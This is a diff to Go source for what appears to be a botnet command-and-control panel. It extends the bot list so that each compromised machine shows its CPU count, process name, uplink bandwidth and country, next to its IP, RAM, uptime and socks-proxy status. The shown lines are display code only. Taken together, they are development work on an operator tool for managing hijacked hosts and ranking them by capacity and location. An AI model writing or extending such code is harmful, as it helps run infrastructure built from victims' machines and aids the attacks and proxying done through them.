@@ -260,12 +260,16 @@ type TUIModel struct {
 
 // BotInfo holds display information about a bot
 type BotInfo struct {
-	ID       string
-	Arch     string
-	IP       string
-	RAM      int64
-	Uptime   time.Duration
-	Selected bool
+	ID          string
+	Arch        string
+	IP          string
+	RAM         int64
+	CPU         int
+	Uptime      time.Duration
+	ProcessName string
+	UplinkMbps  float64
+	Country     string
+	Selected    bool
 }
 
 // SocksInfo holds display information about a socks proxy on a bot
@@ -973,11 +977,15 @@ func (m *TUIModel) refreshBotList() {
 	for id, bot := range botConnections {
 		if bot.authenticated {
 			m.bots = append(m.bots, BotInfo{
-				ID:     id,
-				Arch:   bot.arch,
-				IP:     bot.ip,
-				RAM:    bot.ram,
-				Uptime: time.Since(bot.connectedAt),
+				ID:          id,
+				Arch:        bot.arch,
+				IP:          bot.ip,
+				RAM:         bot.ram,
+				CPU:         bot.cpuCores,
+				Uptime:      time.Since(bot.connectedAt),
+				ProcessName: bot.processName,
+				UplinkMbps:  bot.uplinkMbps,
+				Country:     bot.country,
 			})
 		}
 	}
@@ -1345,11 +1353,18 @@ func (m TUIModel) viewBotList() string {
 		b.WriteString("\n")
 	} else {
 		// Table header
-		header := fmt.Sprintf("  %-20s %-12s %-18s %-10s %-12s", "ID", "ARCH", "IP", "RAM", "UPTIME")
-		b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render(header))
+		colDim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
+		header := fmt.Sprintf("  %-12s %-4s %-14s %-16s %-8s %-5s %-12s %-10s %-10s",
+			"ID", "GEO", "ARCH", "IP", "RAM", "CPU", "PROCESS", "UPLINK", "UPTIME")
+		b.WriteString(colDim.Render(header))
 		b.WriteString("\n")
-		b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  " + strings.Repeat("─", 75)))
+		b.WriteString(colDim.Render("  " + strings.Repeat("─", 96)))
 		b.WriteString("\n")
+
+		// Country flag styling
+		geoStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("226")).Bold(true)
+		procStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
+		uplinkStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
 
 		for i, bot := range m.bots {
 			cursor := "  "
@@ -1360,14 +1375,32 @@ func (m TUIModel) viewBotList() string {
 			}
 
 			uptime := formatDuration(bot.Uptime)
-			line := fmt.Sprintf("%-20s %-12s %-18s %-10s %-12s",
-				truncate(bot.ID, 18),
-				bot.Arch,
-				maskIP(bot.IP),
-				formatRAM(bot.RAM),
-				uptime,
-			)
-			b.WriteString(fmt.Sprintf("%s%s\n", cursor, style.Render(line)))
+			cpuStr := fmt.Sprintf("%d", bot.CPU)
+			uplinkStr := fmt.Sprintf("%.1fM", bot.UplinkMbps)
+			if bot.UplinkMbps >= 1000 {
+				uplinkStr = fmt.Sprintf("%.1fG", bot.UplinkMbps/1000)
+			}
+			country := bot.Country
+			if country == "" {
+				country = "??"
+			}
+			procName := bot.ProcessName
+			if procName == "" {
+				procName = "unknown"
+			}
+
+			// Pad text BEFORE applying styles to avoid ANSI codes breaking alignment
+			line := style.Render(fmt.Sprintf("%-12s", truncate(bot.ID, 10))) + " " +
+				geoStyle.Render(fmt.Sprintf("%-4s", country)) + " " +
+				style.Render(fmt.Sprintf("%-14s", bot.Arch)) + " " +
+				style.Render(fmt.Sprintf("%-16s", maskIP(bot.IP))) + " " +
+				style.Render(fmt.Sprintf("%-8s", formatRAM(bot.RAM))) + " " +
+				style.Render(fmt.Sprintf("%-5s", cpuStr)) + " " +
+				procStyle.Render(fmt.Sprintf("%-12s", truncate(procName, 10))) + " " +
+				uplinkStyle.Render(fmt.Sprintf("%-10s", uplinkStr)) + " " +
+				style.Render(fmt.Sprintf("%-10s", uptime))
+
+			b.WriteString(fmt.Sprintf("%s%s\n", cursor, line))
 		}
 	}
 
